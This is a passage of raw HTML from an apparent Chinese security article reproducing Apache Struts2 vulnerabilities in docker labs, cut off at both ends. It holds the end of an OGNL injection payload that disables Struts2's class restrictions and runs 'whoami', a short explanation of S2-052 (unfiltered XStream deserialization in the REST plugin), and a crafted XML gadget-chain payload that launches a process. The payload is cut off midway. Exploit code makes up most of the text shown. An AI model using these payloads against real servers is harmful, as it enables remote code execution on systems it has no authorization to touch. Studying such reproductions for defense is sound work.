51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlContext@DEFAULT_MEMBER_ACCESS</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">?(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">):((#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">container</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'com.opensymphony.xwork2.ActionContext.container'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">container</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@com</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">opensymphony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">xwork2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlUtil@class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedPackageNames</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedClasses</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setMemberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)))).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">q</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">apache</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">commons</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">IOUtils@toString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Runtime@getRuntime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">exec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'whoami'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">())).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">q</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)}</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.23244026068066617" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/47_icxicqaQyoXmedBJ7fzFo9tZDm1jUA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wicFfhSksRX5v7MvuAf2cAUrfn0JicxicqaQyoXmedBJ7fzFo9tZDm1jUA/640?wx_fmt=png'" data-type="png" data-w="1381" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-052</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">s2-052产生漏洞的原因是REST插件使用到XStreamHandler处理xml数据，由于未对xml数据做任何过滤，在进行发序列xml数据转换为Object时导致RCE</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-052的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.45045045045045046" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/48_ibqWxJiciapyiaNjbSNeRHCQicaCPg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w7uOk6xCHyiaj9BY0qibYtNqcsQ4on4wibqWxJiciapyiaNjbSNeRHCQicaCPg/640?wx_fmt=png'" data-type="png" data-w="1221" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入页面后随便点击一个成员进行编辑并点击submit进行抓包</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3311611374407583" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/49_6FEib5d24OOqq8h0G2Ltn9du7bm1Mg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wAGMg88SQCkmcoDHldia634yzgic6FEib5d24OOqq8h0G2Ltn9du7bm1Mg/640?wx_fmt=png'" data-type="png" data-w="1688" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里可以看到Content-Type为<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">application/x-www-form-urlencoded</code></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/50_oZblunWA0Y0uVA1Mh23L9kMrGQMrJA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wBfC7IGxpmXNPibtrq9TxkKZRNoZblunWA0Y0uVA1Mh23L9kMrGQMrJA/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">构造一个xml文件</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;map&gt;</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;entry&gt;</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;jdk.nashorn.internal.objects.NativeString&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;flags&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">0</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/flags&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;value</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;dataHandler&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;dataSource</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;is</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"javax.crypto.CipherInputStream"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;cipher</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"javax.crypto.NullCipher"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;initialized&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">false</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/initialized&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;opmode&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">0</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/opmode&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;serviceIterator</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"javax.imageio.spi.FilterIterator"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;iter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"javax.imageio.spi.FilterIterator"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;iter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"java.util.Collections$EmptyIterator"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">/&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;next</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"java.lang.ProcessBuilder"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;command&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;string&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">calc.exe</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/string&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/command&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;redirectErrorStream&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">false</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/redirectErrorStream&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/next&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/iter&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;filter</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"javax.imageio.ImageIO$ContainsFilter"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;method&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;class&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">java.lang.ProcessBuilder</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/class&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;name&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">start</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/name&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;parameter-types/&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/method&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;name&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">foo</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/name&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/filter&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;next</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"string"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">foo</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/next&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/serviceIterator&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;lock/&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/cipher&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;input</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"java.lang.ProcessBuilder$NullInputStream"</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">/&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;ibuffer&gt;&lt;/ibuffer&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;done&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">false</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/done&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;ostart&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">0</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/ostart&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;ofinish&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">0</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/ofinish&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;closed&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">false</span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/closed&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/is&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span 